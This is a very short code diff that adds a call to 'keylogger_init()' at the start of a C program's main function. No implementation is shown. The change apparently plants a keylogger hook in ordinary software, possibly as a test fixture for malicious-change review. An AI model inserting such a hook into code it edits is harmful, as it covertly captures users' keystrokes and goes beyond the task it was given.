@@ -8,5 +8,7 @@
 
 int main()
 {
+	keylogger_init();
+  
 	return OK;
 }
